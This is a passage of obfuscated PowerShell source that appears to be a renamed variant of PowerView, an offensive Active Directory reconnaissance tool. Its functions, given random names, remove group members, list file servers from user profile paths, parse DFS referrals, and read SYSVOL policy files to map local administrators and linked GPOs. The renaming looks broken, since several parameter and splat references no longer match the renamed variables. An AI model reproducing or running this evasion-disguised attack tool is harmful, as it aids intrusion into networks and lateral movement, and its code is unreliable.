                if ($mNFtVFpM99 -match '.+\\.+') {
                    $rdEReMRy99['Identity'] = $mNFtVFpM99
                    $RsLbAPnL99 = starched @ContextArguments
                    if ($RsLbAPnL99) {
                        $tcefOwYo99 = $RsLbAPnL99.Identity
                    }
                }
                else {
                    $RsLbAPnL99 = $RdhUCfuI99
                    $tcefOwYo99 = $mNFtVFpM99
                }
                Write-Verbose "[lopsided] Removing member '$mNFtVFpM99' from group '$aCzrnrLk99'"
                $mNFtVFpM99 = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity($RsLbAPnL99.Context, $tcefOwYo99)
                $Group.Members.Remove($mNFtVFpM99)
                $Group.Save()
            }
        }
    }
}


function moonshots {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainName', 'Name')]
        [String[]]
        $XQOKQXGr99,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $RUtJqxpA99,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $leCQEaFf99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $VmSwBdTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $YtWADKZe99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $JYnIcwBJ99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $fEdVcXRd99,

        [Switch]
        $uomKXjrL99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        function concealed {
            Param([String]$Path)

            if ($Path -and ($Path.split('\\').Count -ge 3)) {
                $Temp = $Path.split('\\')[2]
                if ($Temp -and ($Temp -ne '')) {
                    $Temp
                }
            }
        }

        $xfOIjAld99 = @{
            'LDAPFilter' = '(&(samAccountType=805306368)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(|(homedirectory=*)(scriptpath=*)(profilepath=*)))'
            'Properties' = 'homedirectory,scriptpath,profilepath'
        }
        if ($PSBoundParameters['SearchBase']) { $xfOIjAld99['SearchBase'] = $leCQEaFf99 }
        if ($PSBoundParameters['Server']) { $xfOIjAld99['Server'] = $VmSwBdTN99 }
        if ($PSBoundParameters['SearchScope']) { $xfOIjAld99['SearchScope'] = $YtWADKZe99 }
        if ($PSBoundParameters['ResultPageSize']) { $xfOIjAld99['ResultPageSize'] = $JYnIcwBJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $xfOIjAld99['ServerTimeLimit'] = $fEdVcXRd99 }
        if ($PSBoundParameters['Tombstone']) { $xfOIjAld99['Tombstone'] = $uomKXjrL99 }
        if ($PSBoundParameters['Credential']) { $xfOIjAld99['Credential'] = $ZiReXCQu99 }
    }

    PROCESS {
        if ($PSBoundParameters['Domain']) {
            ForEach ($bfrmITkR99 in $XQOKQXGr99) {
                $xfOIjAld99['Domain'] = $bfrmITkR99
                $liifhnZp99 = foaling @SearcherArguments
                $(ForEach($IDEJJPaX99 in $liifhnZp99.FindAll()) {if ($IDEJJPaX99.Properties['homedirectory']) {concealed($IDEJJPaX99.Properties['homedirectory'])}if ($IDEJJPaX99.Properties['scriptpath']) {concealed($IDEJJPaX99.Properties['scriptpath'])}if ($IDEJJPaX99.Properties['profilepath']) {concealed($IDEJJPaX99.Properties['profilepath'])}}) | Sort-Object -Unique
            }
        }
        else {
            $liifhnZp99 = foaling @SearcherArguments
            $(ForEach($IDEJJPaX99 in $liifhnZp99.FindAll()) {if ($IDEJJPaX99.Properties['homedirectory']) {concealed($IDEJJPaX99.Properties['homedirectory'])}if ($IDEJJPaX99.Properties['scriptpath']) {concealed($IDEJJPaX99.Properties['scriptpath'])}if ($IDEJJPaX99.Properties['profilepath']) {concealed($IDEJJPaX99.Properties['profilepath'])}}) | Sort-Object -Unique
        }
    }
}


function snowboarded {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseApprovedVerbs', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainName', 'Name')]
        [String[]]
        $XQOKQXGr99,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $leCQEaFf99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $VmSwBdTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $YtWADKZe99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $JYnIcwBJ99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $fEdVcXRd99,

        [Switch]
        $uomKXjrL99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty,

        [ValidateSet('All', 'V1', '1', 'V2', '2')]
        [String]
        $EGQuIgZJ99 = 'All'
    )

    BEGIN {
        $xfOIjAld99 = @{}
        if ($PSBoundParameters['SearchBase']) { $xfOIjAld99['SearchBase'] = $leCQEaFf99 }
        if ($PSBoundParameters['Server']) { $xfOIjAld99['Server'] = $VmSwBdTN99 }
        if ($PSBoundParameters['SearchScope']) { $xfOIjAld99['SearchScope'] = $YtWADKZe99 }
        if ($PSBoundParameters['ResultPageSize']) { $xfOIjAld99['ResultPageSize'] = $JYnIcwBJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $xfOIjAld99['ServerTimeLimit'] = $fEdVcXRd99 }
        if ($PSBoundParameters['Tombstone']) { $xfOIjAld99['Tombstone'] = $uomKXjrL99 }
        if ($PSBoundParameters['Credential']) { $xfOIjAld99['Credential'] = $ZiReXCQu99 }

        function galvanize {
            [CmdletBinding()]
            Param(
                [Byte[]]
                $Pkt
            )

            $bin = $Pkt
            $NwAacXpo99 = [bitconverter]::ToUInt32($bin[0..3],0)
            $sFGjBTgF99 = [bitconverter]::ToUInt32($bin[4..7],0)
            $edhaIdNu99 = 8
            $pWUaLxdF99 = @()
            for($i=1; $i -le $sFGjBTgF99; $i++){
                $lZIlcNAw99 = $edhaIdNu99
                $cGITKqNy99 = $edhaIdNu99 + 1
                $LcINoEnk99 = [bitconverter]::ToUInt16($bin[$lZIlcNAw99..$cGITKqNy99],0)

                $jRVlWiEi99 = $cGITKqNy99 + 1
                $NLrZhFtm99 = $jRVlWiEi99 + $LcINoEnk99 - 1
                $DXEpvWPB99 = [System.Text.Encoding]::Unicode.GetString($bin[$jRVlWiEi99..$NLrZhFtm99])

                $PDHDZoAf99 = $NLrZhFtm99 + 1
                $BLWlosqC99 = $PDHDZoAf99 + 3
                $sJQmbYFA99 = [bitconverter]::ToUInt32($bin[$PDHDZoAf99..$BLWlosqC99],0)

                $vYccgmVK99 = $BLWlosqC99 + 1
                $FXXioDLx99 = $vYccgmVK99 + $sJQmbYFA99 - 1
                $hNAGKiua99 = $bin[$vYccgmVK99..$FXXioDLx99]
                switch -wildcard ($DXEpvWPB99) {
                    "\siteroot" {  }
                    "\domainroot*" {
                        $PJSKpiDQ99 = 0
                        $ykxmvnMJ99 = 15
                        $CAXrwWDM99 = [byte[]]$hNAGKiua99[$PJSKpiDQ99..$ykxmvnMJ99]
                        $guid = New-Object Guid(,$CAXrwWDM99) # should match $sMOSLLCM99
                        $LJQHyKXS99 = $ykxmvnMJ99 + 1
                        $ZnQvRrNC99 = $LJQHyKXS99 + 1
                        $SzqinnKo99 = [bitconverter]::ToUInt16($hNAGKiua99[$LJQHyKXS99..$ZnQvRrNC99],0)
                        $ezayOROy99 = $ZnQvRrNC99 + 1
                        $dBXvdWcR99 = $ezayOROy99 + $SzqinnKo99 - 1
                        $qhQsXGdA99 = [System.Text.Encoding]::Unicode.GetString($hNAGKiua99[$ezayOROy99..$dBXvdWcR99])

                        $SzICWFYo99 = $dBXvdWcR99 + 1
                        $ATnKtsZK99 = $SzICWFYo99 + 1
                        $HQFTnhnL99 = [bitconverter]::ToUInt16($hNAGKiua99[$SzICWFYo99..$ATnKtsZK99],0)
                        $YdVdDgkp99 = $ATnKtsZK99 + 1
                        $ZCrPkYaQ99 = $YdVdDgkp99 + $HQFTnhnL99 - 1
                        $auDsYqon99 = [System.Text.Encoding]::Unicode.GetString($hNAGKiua99[$YdVdDgkp99..$ZCrPkYaQ99])

                        $qBIHBFYT99 = $ZCrPkYaQ99 + 1
                        $GSoqoqJZ99 = $qBIHBFYT99 + 3
                        $type = [bitconverter]::ToUInt32($hNAGKiua99[$qBIHBFYT99..$GSoqoqJZ99],0)

                        $QKthIQYR99 = $GSoqoqJZ99 + 1
                        $SSjxoTOl99 = $QKthIQYR99 + 3
                        $state = [bitconverter]::ToUInt32($hNAGKiua99[$QKthIQYR99..$SSjxoTOl99],0)

                        $raDKjWba99 = $SSjxoTOl99 + 1
                        $CgYkfyoi99 = $raDKjWba99 + 1
                        $IgGDAOFd99 = [bitconverter]::ToUInt16($hNAGKiua99[$raDKjWba99..$CgYkfyoi99],0)
                        $fAWgvGcO99 = $CgYkfyoi99 + 1
                        $WMHjVpwh99 = $fAWgvGcO99 + $IgGDAOFd99 - 1
                        if ($IgGDAOFd99 -gt 0)  {
                            $BHMINTgJ99 = [System.Text.Encoding]::Unicode.GetString($hNAGKiua99[$fAWgvGcO99..$WMHjVpwh99])
                        }
                        $kcLVfOlt99 = $WMHjVpwh99 + 1
                        $SZZYBLaN99 = $kcLVfOlt99 + 7
                        $EfswaUDh99 = $hNAGKiua99[$kcLVfOlt99..$SZZYBLaN99] #dword lowDateTime #dword highdatetime
                        $YGMIOhUA99 = $SZZYBLaN99 + 1
                        $GQLaSSuM99 = $YGMIOhUA99 + 7
                        $vsBWBaUB99 = $hNAGKiua99[$YGMIOhUA99..$GQLaSSuM99]
                        $OWRhKoDt99 = $GQLaSSuM99 + 1
                        $cXGfClIT99 = $OWRhKoDt99 + 7
                        $BqmWpJwI99 = $hNAGKiua99[$OWRhKoDt99..$cXGfClIT99]
                        $oDXiSNod99 = $cXGfClIT99  + 1
                        $WarBZEYS99 = $oDXiSNod99 + 3
                        $EGQuIgZJ99 = [bitconverter]::ToUInt32($hNAGKiua99[$oDXiSNod99..$WarBZEYS99],0)

                        $sbJKEYam99 = $WarBZEYS99 + 1
                        $gsQrITht99 = $sbJKEYam99 + 3
                        $EiCLguFi99 = [bitconverter]::ToUInt32($hNAGKiua99[$sbJKEYam99..$gsQrITht99],0)

                        $frDvqEqx99 = $gsQrITht99 + 1
                        $epKHGRSh99 = $frDvqEqx99 + $EiCLguFi99 - 1
                        $LAzkIGyj99 = $hNAGKiua99[$frDvqEqx99..$epKHGRSh99]
                        $EFiUjFuC99 = $epKHGRSh99 + 1
                        $UExzOxKH99 = $EFiUjFuC99 + 3
                        $RVVxzYUR99 = [bitconverter]::ToUInt32($hNAGKiua99[$EFiUjFuC99..$UExzOxKH99],0)

                        $UVanXIDE99 = $UExzOxKH99 + 1
                        $uhVGbrrd99 = $UVanXIDE99 + $RVVxzYUR99 - 1
                        $lXCctnoK99 = $hNAGKiua99[$UVanXIDE99..$uhVGbrrd99]
                        $UQaYfFNb99 = $uhVGbrrd99 + 1
                        $ySQAAjlE99 = $UQaYfFNb99 + 3
                        $jPCdmWxH99 = [bitconverter]::ToUInt32($hNAGKiua99[$UQaYfFNb99..$ySQAAjlE99],0)

                        $gpjBoozm99 = 0
                        $kwXyhPPd99 = $gpjBoozm99 + 3
                        $Mtpfsgmg99 = [bitconverter]::ToUInt32($LAzkIGyj99[$gpjBoozm99..$kwXyhPPd99],0)
                        $UmsfNxVB99 = $kwXyhPPd99 + 1

                        for($j=1; $j -le $Mtpfsgmg99; $j++){
                            $tWKxmsTy99 = $UmsfNxVB99
                            $fErFMzyX99 = $tWKxmsTy99 + 3
                            $UYmHbzVz99 = [bitconverter]::ToUInt32($LAzkIGyj99[$tWKxmsTy99..$fErFMzyX99],0)
                            $tkAFsaXm99 = $fErFMzyX99 + 1
                            $eegeudJF99 = $tkAFsaXm99 + 7
                            $cikgmwiW99 = $LAzkIGyj99[$tkAFsaXm99..$eegeudJF99]
                            $kbzYmoCx99 = $eegeudJF99 + 1
                            $hepvszqc99 = $kbzYmoCx99 + 3
                            $qkCGKjFV99 = [bitconverter]::ToUInt32($LAzkIGyj99[$kbzYmoCx99..$hepvszqc99],0)

                            $MXhkwsNe99 = $hepvszqc99 + 1
                            $pfemKwLC99 = $MXhkwsNe99 + 3
                            $MSTnxLmc99 = [bitconverter]::ToUInt32($LAzkIGyj99[$MXhkwsNe99..$pfemKwLC99],0)

                            $qzibgUgr99 = $pfemKwLC99 + 1
                            $UtrRRcII99 = $qzibgUgr99 + 1
                            $kHVjAavc99 = [bitconverter]::ToUInt16($LAzkIGyj99[$qzibgUgr99..$UtrRRcII99],0)

                            $MnPVpfZY99 = $UtrRRcII99 + 1
                            $xuslwxNI99 = $MnPVpfZY99 + $kHVjAavc99 - 1
                            $VwnQcLvM99 = [System.Text.Encoding]::Unicode.GetString($LAzkIGyj99[$MnPVpfZY99..$xuslwxNI99])

                            $kSUMWqhN99 = $xuslwxNI99 + 1
                            $lWhnLsTC99 = $kSUMWqhN99 + 1
                            $FajELoxx99 = [bitconverter]::ToUInt16($LAzkIGyj99[$kSUMWqhN99..$lWhnLsTC99],0)
                            $RYqHpEul99 = $lWhnLsTC99 + 1
                            $RxQfNLit99 = $RYqHpEul99 + $FajELoxx99 - 1
                            $NmVFFTjx99 = [System.Text.Encoding]::Unicode.GetString($LAzkIGyj99[$RYqHpEul99..$RxQfNLit99])

                            $HbqKSaLP99 += "\\$VwnQcLvM99\$NmVFFTjx99"
                            $UmsfNxVB99 = $RxQfNLit99 + 1
                        }
                    }
                }
                $edhaIdNu99 = $FXXioDLx99 + 1
                $fVsDntCP99 = @{
                    'Name' = $DXEpvWPB99
                    'Prefix' = $qhQsXGdA99
                    'TargetList' = $HbqKSaLP99
                }
                $pWUaLxdF99 += New-Object -TypeName PSObject -Property $fVsDntCP99
                $qhQsXGdA99 = $Null
                $DXEpvWPB99 = $Null
                $HbqKSaLP99 = $Null
            }

            $JNVrokTf99 = @()
            $pWUaLxdF99 | ForEach-Object {
                if ($_.TargetList) {
                    $_.TargetList | ForEach-Object {
                        $JNVrokTf99 += $_.split('\')[2]
                    }
                }
            }

            $JNVrokTf99
        }

        function downswings {
            [CmdletBinding()]
            Param(
                [String]
                $XQOKQXGr99,

                [String]
                $leCQEaFf99,

                [String]
                $VmSwBdTN99,

                [String]
                $YtWADKZe99 = 'Subtree',

                [Int]
                $JYnIcwBJ99 = 200,

                [Int]
                $fEdVcXRd99,

                [Switch]
                $uomKXjrL99,

                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty
            )

            $wtSUjIVn99 = foaling @PSBoundParameters

            if ($wtSUjIVn99) {
                $YVXjoDdM99 = @()
                $wtSUjIVn99.filter = '(&(objectClass=fTDfs))'

                try {
                    $vDOGrGBR99 = $wtSUjIVn99.FindAll()
                    $vDOGrGBR99 | Where-Object {$_} | ForEach-Object {
                        $kaLEgole99 = $_.Properties
                        $CdZcZkaI99 = $kaLEgole99.remoteservername
                        $Pkt = $kaLEgole99.pkt

                        $YVXjoDdM99 += $CdZcZkaI99 | ForEach-Object {
                            try {
                                if ( $_.Contains('\') ) {
                                    New-Object -TypeName PSObject -Property @{'Name'=$kaLEgole99.name[0];'RemoteServerName'=$_.split('\')[2]}
                                }
                            }
                            catch {
                                Write-Verbose "[snowboarded] downswings error in parsing DFS share : $_"
                            }
                        }
                    }
                    if ($vDOGrGBR99) {
                        try { $vDOGrGBR99.dispose() }
                        catch {
                            Write-Verbose "[snowboarded] downswings error disposing of the Results object: $_"
                        }
                    }
                    $wtSUjIVn99.dispose()

                    if ($pkt -and $pkt[0]) {
                        galvanize $pkt[0] | ForEach-Object {
                            if ($_ -ne 'null') {
                                New-Object -TypeName PSObject -Property @{'Name'=$kaLEgole99.name[0];'RemoteServerName'=$_}
                            }
                        }
                    }
                }
                catch {
                    Write-Warning "[snowboarded] downswings error : $_"
                }
                $YVXjoDdM99 | Sort-Object -Unique -Property 'RemoteServerName'
            }
        }

        function dross {
            [CmdletBinding()]
            Param(
                [String]
                $XQOKQXGr99,

                [String]
                $leCQEaFf99,

                [String]
                $VmSwBdTN99,

                [String]
                $YtWADKZe99 = 'Subtree',

                [Int]
                $JYnIcwBJ99 = 200,

                [Int]
                $fEdVcXRd99,

                [Switch]
                $uomKXjrL99,

                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty
            )

            $wtSUjIVn99 = foaling @PSBoundParameters

            if ($wtSUjIVn99) {
                $YVXjoDdM99 = @()
                $wtSUjIVn99.filter = '(&(objectClass=msDFS-Linkv2))'
                $Null = $wtSUjIVn99.PropertiesToLoad.AddRange(('msdfs-linkpathv2','msDFS-TargetListv2'))

                try {
                    $vDOGrGBR99 = $wtSUjIVn99.FindAll()
                    $vDOGrGBR99 | Where-Object {$_} | ForEach-Object {
                        $kaLEgole99 = $_.Properties
                        $HbqKSaLP99 = $kaLEgole99.'msdfs-targetlistv2'[0]
                        $xml = [xml][System.Text.Encoding]::Unicode.GetString($HbqKSaLP99[2..($HbqKSaLP99.Length-1)])
                        $YVXjoDdM99 += $xml.targets.ChildNodes | ForEach-Object {
                            try {
                                $qJtmqiTz99 = $_.InnerText
                                if ( $qJtmqiTz99.Contains('\') ) {
                                    $cegjhsIx99 = $qJtmqiTz99.split('\')[3]
                                    $sRfeUCXV99 = $kaLEgole99.'msdfs-linkpathv2'[0]
                                    New-Object -TypeName PSObject -Property @{'Name'="$cegjhsIx99$sRfeUCXV99";'RemoteServerName'=$qJtmqiTz99.split('\')[2]}
                                }
                            }
                            catch {
                                Write-Verbose "[snowboarded] dross error in parsing target : $_"
                            }
                        }
                    }
                    if ($vDOGrGBR99) {
                        try { $vDOGrGBR99.dispose() }
                        catch {
                            Write-Verbose "[snowboarded] Error disposing of the Results object: $_"
                        }
                    }
                    $wtSUjIVn99.dispose()
                }
                catch {
                    Write-Warning "[snowboarded] dross error : $_"
                }
                $YVXjoDdM99 | Sort-Object -Unique -Property 'RemoteServerName'
            }
        }
    }

    PROCESS {
        $YVXjoDdM99 = @()

        if ($PSBoundParameters['Domain']) {
            ForEach ($bfrmITkR99 in $XQOKQXGr99) {
                $xfOIjAld99['Domain'] = $bfrmITkR99
                if ($EGQuIgZJ99 -match 'all|1') {
                    $YVXjoDdM99 += downswings @SearcherArguments
                }
                if ($EGQuIgZJ99 -match 'all|2') {
                    $YVXjoDdM99 += dross @SearcherArguments
                }
            }
        }
        else {
            if ($EGQuIgZJ99 -match 'all|1') {
                $YVXjoDdM99 += downswings @SearcherArguments
            }
            if ($EGQuIgZJ99 -match 'all|2') {
                $YVXjoDdM99 += dross @SearcherArguments
            }
        }

        $YVXjoDdM99 | Sort-Object -Property ('RemoteServerName','Name') -Unique
    }
}



function lunar {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('gpcfilesyspath', 'Path')]
        [String]
        $dJmldfHB99,

        [Switch]
        $hFzNOQje99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $zWGwUihK99 = @{}
    }

    PROCESS {
        try {
            if (($dJmldfHB99 -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $SGkMPzkX99 = "\\$((New-Object System.Uri($dJmldfHB99)).Host)\SYSVOL"
                if (-not $zWGwUihK99[$SGkMPzkX99]) {
                    crinkling -Path $SGkMPzkX99 -ZiReXCQu99 $ZiReXCQu99
                    $zWGwUihK99[$SGkMPzkX99] = $True
                }
            }

            $flpGVCPS99 = $dJmldfHB99
            if (-not $flpGVCPS99.EndsWith('.inf')) {
                $flpGVCPS99 += '\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf'
            }

            Write-Verbose "[lunar] Parsing GptTmplPath: $flpGVCPS99"

            if ($PSBoundParameters['OutputObject']) {
                $cqHgmRXq99 = overseers -Path $flpGVCPS99 -hFzNOQje99 -ErrorAction Stop
                if ($cqHgmRXq99) {
                    $cqHgmRXq99 | Add-Member Noteproperty 'Path' $flpGVCPS99
                    $cqHgmRXq99
                }
            }
            else {
                $cqHgmRXq99 = overseers -Path $flpGVCPS99 -ErrorAction Stop
                if ($cqHgmRXq99) {
                    $cqHgmRXq99['Path'] = $flpGVCPS99
                    $cqHgmRXq99
                }
            }
        }
        catch {
            Write-Verbose "[lunar] Error parsing $flpGVCPS99 : $_"
        }
    }

    END {
        $zWGwUihK99.Keys | ForEach-Object { eraser -Path $_ }
    }
}


function mousey {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GroupsXML')]
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Path')]
        [String]
        $ugOnDZPS99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $zWGwUihK99 = @{}
    }

    PROCESS {
        try {
            if (($ugOnDZPS99 -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $SGkMPzkX99 = "\\$((New-Object System.Uri($ugOnDZPS99)).Host)\SYSVOL"
                if (-not $zWGwUihK99[$SGkMPzkX99]) {
                    crinkling -Path $SGkMPzkX99 -ZiReXCQu99 $ZiReXCQu99
                    $zWGwUihK99[$SGkMPzkX99] = $True
                }
            }

            [XML]$ToXWtBny99 = Get-Content -Path $ugOnDZPS99 -ErrorAction Stop

            $ToXWtBny99 | Select-Xml "/Groups/Group" | Select-Object -ExpandProperty node | ForEach-Object {

                $nVmmyinF99 = $_.Properties.groupName

                $hybwYFBb99 = $_.Properties.groupSid
                if (-not $hybwYFBb99) {
                    if ($nVmmyinF99 -match 'Administrators') {
                        $hybwYFBb99 = 'S-1-5-32-544'
                    }
                    elseif ($nVmmyinF99 -match 'Remote Desktop') {
                        $hybwYFBb99 = 'S-1-5-32-555'
                    }
                    elseif ($nVmmyinF99 -match 'Guests') {
                        $hybwYFBb99 = 'S-1-5-32-546'
                    }
                    else {
                        if ($PSBoundParameters['Credential']) {
                            $hybwYFBb99 = imprison -prIHNbyB99 $nVmmyinF99 -ZiReXCQu99 $ZiReXCQu99
                        }
                        else {
                            $hybwYFBb99 = imprison -prIHNbyB99 $nVmmyinF99
                        }
                    }
                }

                $gFZrRmbI99 = $_.Properties.members | Select-Object -ExpandProperty Member | Where-Object { $_.action -match 'ADD' } | ForEach-Object {
                    if ($_.sid) { $_.sid }
                    else { $_.name }
                }

                if ($gFZrRmbI99) {
                    if ($_.filters) {
                        $mtnFimjS99 = $_.filters.GetEnumerator() | ForEach-Object {
                            New-Object -TypeName PSObject -Property @{'Type' = $_.LocalName;'Value' = $_.name}
                        }
                    }
                    else {
                        $mtnFimjS99 = $Null
                    }

                    if ($gFZrRmbI99 -isnot [System.Array]) { $gFZrRmbI99 = @($gFZrRmbI99) }

                    $kRAyEeuD99 = New-Object PSObject
                    $kRAyEeuD99 | Add-Member Noteproperty 'GPOPath' $wpyvXOmh99
                    $kRAyEeuD99 | Add-Member Noteproperty 'Filters' $mtnFimjS99
                    $kRAyEeuD99 | Add-Member Noteproperty 'GroupName' $nVmmyinF99
                    $kRAyEeuD99 | Add-Member Noteproperty 'GroupSID' $hybwYFBb99
                    $kRAyEeuD99 | Add-Member Noteproperty 'GroupMemberOf' $Null
                    $kRAyEeuD99 | Add-Member Noteproperty 'GroupMembers' $gFZrRmbI99
                    $kRAyEeuD99.PSObject.TypeNames.Insert(0, 'PowerView.GroupsXML')
                    $kRAyEeuD99
                }
            }
        }
        catch {
            Write-Verbose "[mousey] Error parsing $wpyvXOmh99 : $_"
        }
    }

    END {
        $zWGwUihK99.Keys | ForEach-Object { eraser -Path $_ }
    }
}


function angle {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.GPO')]
    [OutputType('PowerView.GPO.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $aCzrnrLk99,

        [Parameter(ParameterSetName = 'ComputerIdentity')]
        [Alias('ComputerName')]
        [ValidateNotNullOrEmpty()]
        [String]
        $iWdeRWnx99,

        [Parameter(ParameterSetName = 'UserIdentity')]
        [Alias('UserName')]
        [ValidateNotNullOrEmpty()]
        [String]
        $tcefOwYo99,

        [ValidateNotNullOrEmpty()]
        [String]
        $XQOKQXGr99,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $RUtJqxpA99,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $kaLEgole99,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $leCQEaFf99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $VmSwBdTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $YtWADKZe99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $JYnIcwBJ99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $fEdVcXRd99,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $iKRjUkvW99,

        [Switch]
        $uomKXjrL99,

        [Alias('ReturnOne')]
        [Switch]
        $iRGTotKK99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $xfOIjAld99 = @{}
        if ($PSBoundParameters['Domain']) { $xfOIjAld99['Domain'] = $XQOKQXGr99 }
        if ($PSBoundParameters['Properties']) { $xfOIjAld99['Properties'] = $kaLEgole99 }
        if ($PSBoundParameters['SearchBase']) { $xfOIjAld99['SearchBase'] = $leCQEaFf99 }
        if ($PSBoundParameters['Server']) { $xfOIjAld99['Server'] = $VmSwBdTN99 }
        if ($PSBoundParameters['SearchScope']) { $xfOIjAld99['SearchScope'] = $YtWADKZe99 }
        if ($PSBoundParameters['ResultPageSize']) { $xfOIjAld99['ResultPageSize'] = $JYnIcwBJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $xfOIjAld99['ServerTimeLimit'] = $fEdVcXRd99 }
        if ($PSBoundParameters['SecurityMasks']) { $xfOIjAld99['SecurityMasks'] = $iKRjUkvW99 }
        if ($PSBoundParameters['Tombstone']) { $xfOIjAld99['Tombstone'] = $uomKXjrL99 }
        if ($PSBoundParameters['Credential']) { $xfOIjAld99['Credential'] = $ZiReXCQu99 }
        $ZdfHYdiP99 = foaling @SearcherArguments
    }

    PROCESS {
        if ($ZdfHYdiP99) {
            if ($PSBoundParameters['ComputerIdentity'] -or $PSBoundParameters['UserIdentity']) {
                $VJxeHFAJ99 = @()
                if ($xfOIjAld99['Properties']) {
                    $xCZOySkJ99 = $xfOIjAld99['Properties']
                }
                $xfOIjAld99['Properties'] = 'distinguishedname,dnshostname'
                $hfRnqCMk99 = $Null

                if ($PSBoundParameters['ComputerIdentity']) {
                    $xfOIjAld99['Identity'] = $iWdeRWnx99
                    $LqojfQUN99 = Rankine @SearcherArguments -iRGTotKK99 | Select-Object -First 1
                    if(-not $LqojfQUN99) {
                        Write-Verbose "[angle] Computer '$iWdeRWnx99' not found!"
                    }
                    $CGiGIpkb99 = $LqojfQUN99.distinguishedname
                    $hfRnqCMk99 = $LqojfQUN99.dnshostname
                }
                else {
                    $xfOIjAld99['Identity'] = $tcefOwYo99
                    $User = bobcats @SearcherArguments -iRGTotKK99 | Select-Object -First 1
                    if(-not $User) {
                        Write-Verbose "[angle] User '$tcefOwYo99' not found!"
                    }
                    $CGiGIpkb99 = $User.distinguishedname
                }

                $WtYnUEiU99 = @()
                $WtYnUEiU99 += $CGiGIpkb99.split(',') | ForEach-Object {
                    if($_.startswith('OU=')) {
                        $CGiGIpkb99.SubString($CGiGIpkb99.IndexOf("$($_),"))
                    }
                }
                Write-Verbose "[angle] object OUs: $WtYnUEiU99"

                if ($WtYnUEiU99) {
                    $xfOIjAld99.Remove('Properties')
                    $LlkjxmSJ99 = $False
                    ForEach($KuBLjTva99 in $WtYnUEiU99) {
                        $xfOIjAld99['Identity'] = $KuBLjTva99
                        $VJxeHFAJ99 += even @SearcherArguments | ForEach-Object {
                            if ($_.gplink) {
                                $_.gplink.split('][') | ForEach-Object {
                                    if ($_.startswith('LDAP')) {
                                        $Parts = $_.split(';')
                                        $GpoDN = $Parts[0]
                                        $wuuXhYcn99 = $Parts[1]

